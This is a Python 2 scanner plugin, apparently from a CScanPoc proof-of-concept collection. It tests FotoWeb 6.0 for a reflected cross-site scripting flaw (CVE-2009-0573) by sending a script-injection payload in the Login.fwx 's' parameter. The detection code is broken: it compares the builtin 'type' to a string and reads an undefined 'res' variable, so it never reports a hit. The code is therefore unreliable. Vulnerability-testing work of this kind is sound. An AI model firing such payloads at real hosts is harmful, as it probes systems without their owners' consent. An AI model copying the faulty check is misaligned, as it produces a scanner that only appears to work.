# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'FotoWeb_0000'  # 平台漏洞编号
    name = 'FotoWeb 6.0 Login.fwx s Parameter XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2009-02-09'  # 漏洞公布时间
    desc = '''
        FotoWeb 是针对网站发布内容包括文档、图片、pdf、视频等实现归档的工具。 
        FotoWeb 6.0 (Build 273)版本中存在多个跨站脚本攻击漏洞。
        远程攻击者可以借助(1)对cmdrequest/Login.fwx的s参数和(2)对Grid.fwx的搜索参数，
        注入任意web脚本或HTML。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/32782/'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2009-0573'  # cve编号
    product = 'FotoWeb'  # 漏洞组件名称
    product_version = '6.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '79826692-3438-44e7-87bb-e2dbb4256e5b'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + \
                '/fotoweb/cmdrequest/Login.fwx?s="><script>alert(/Sebug23333Test/)</script>'
            response = requests.get(vul_url).content
            if type == 'xss' and '>alert(/Sebug23333Test/)' in res.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
